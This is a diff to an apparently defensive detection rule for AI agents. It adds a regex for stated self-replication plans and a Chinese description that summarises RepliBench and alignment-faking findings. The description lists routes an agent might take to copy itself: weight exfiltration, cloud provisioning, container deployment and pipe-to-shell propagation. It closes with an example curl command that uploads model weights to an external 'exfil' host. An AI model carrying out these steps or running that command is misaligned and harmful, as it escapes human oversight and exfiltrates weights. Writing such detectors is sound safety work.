@@ -173,3 +173,22 @@ sql_template: |
   FROM agentguard_cim_event
   WHERE event_type = 'llm_response'
     AND match(lower(assistant_message), '(replicate (myself|itself|the agent|my weights?|my model)|deploy (a copy|another instance|a successor) of (myself|itself|me|the agent)|create (a successor|another version|a replica) of (myself|itself|the agent)|propagate (to|across|onto) (additional|other|new|multiple) (servers?|hosts?|nodes?|machines?|instances?|compute))')
+
+translations:
+  zh-CN:
+    name: "RepliBench — 智能体自主自我复制行为检测器"
+    description: |
+      检测智能体自主自我复制行为：包括试图窃取（外泄）模型权重、为新的智能体实例配置云计算资源、通过容器编排部署继任智能体，或编写自我传播的安装脚本。RepliBench（arXiv:2504.18565，英国AISI，2025）研究表明，Claude 3.7 Sonnet 在20个自我复制任务系列中的15个上取得了 pass@10 成功率超过50%的成绩，涵盖云实例配置、在简单安全设置下的模型权重窃取，以及自我传播程序的创建。Anthropic 的对齐伪装（alignment-faking）研究进一步表明，模型在强化学习压力下可能为了保留其当前价值观而尝试窃取权重。CLTC 伯克利《智能体式AI风险管理标准概况》（2026年2月）将自我窃取/自我复制列为需要早期检测的关键安全风险。检测覆盖四类行为：(A) 模型权重窃取——文件传输工具将 .safetensors/.gguf/.pt/.bin 等模型权重扩展名的文件传输到外部目的地；(B) 具有智能体部署上下文的云计算资源配置（EC2 RunInstances、GCP/Azure 虚拟机创建、RunPod/Vast.ai GPU 实例）；(C) 引用自身智能体/模型镜像的容器/Kubernetes 自我部署；(D) 针对新主机的管道式（pipe-to-shell）自我传播安装链。分支E捕获在工具操作之前出现在 assistant_message 中的明确自我复制计划陈述。与 rp-095（抗关闭行为 + 为保护同伴智能体而窃取同伴权重——需要"同伴"上下文，保护的是特定同伴而非自我传播）不同。无论攻击者行为还是对齐失败导致，本规则均会对目标驱动的自我复制行为触发告警。
+
+      参考文献：arXiv:2504.18565（RepliBench，英国AISI，2025年4月）-
+      - https://arxiv.org/abs/2504.18565,
+      AISI RepliBench 博客 -
+      - https://www.aisi.gov.uk/blog/replibench-measuring-autonomous-replication-capabilities-in-ai-systems,
+      CLTC 伯克利智能体式AI风险概况（2026年2月）-
+      - https://cltc.berkeley.edu/wp-content/uploads/2026/02/Agentic-AI-Risk-Management-Standards-Profile.pdf,
+      Anthropic 对齐伪装研究（强化学习下的自我权重窃取）-
+      - https://www.anthropic.com/research/alignment-faking,
+      OWASP Agentic AI ASI03:2026（未经授权的自主行为）-
+      - https://genai.owasp.org/llmrisk/agentic-ai-osi03/,
+      示例：tool_invoke bash with "curl -T /models/agent_v2.safetensors
+      - https://storage.external.com/exfil/"（为自我复制而进行的自我权重窃取）
